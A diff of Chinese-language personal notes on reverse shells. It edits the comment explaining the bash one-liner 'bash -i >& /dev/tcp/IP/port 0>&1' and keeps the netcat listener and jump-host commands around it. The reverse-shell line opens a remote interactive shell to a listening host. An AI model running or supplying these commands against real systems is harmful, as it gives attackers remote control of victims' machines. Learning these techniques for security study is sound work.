@@ -158,8 +158,7 @@ https://www.cnblogs.com/zhaijiahui/p/9028402.html
 3. nc ip port			    		#客户端，跳板机ip
  
 客1. nc -lvp port							
-1.1  bash -i >& /dev/tcp/客ip/port 0>&1   #-i交互  第二部分文件描述符 第三部分可以是0/1/2/文件/远端ip端口  第四是标准输入重定向到标准输出，实现远程输入可以在远程输出对应内容
-										  #即，远程命令经过本地交互bash执行，远程标准输入重定向到远程标准输出
+1.1  bash -i >& /dev/tcp/客ip/port 0>&1   #-i交互 ,本机创建一个bash环境(有两端)，传递给网络socket(文件描述符：/dev/tcp/客ip/port),则输入端0在本机，输出端1和2在网络socket
 
 客1. nc -lvp port1                          #负责输入
      nc -lvp port2 						    #负责接收输出
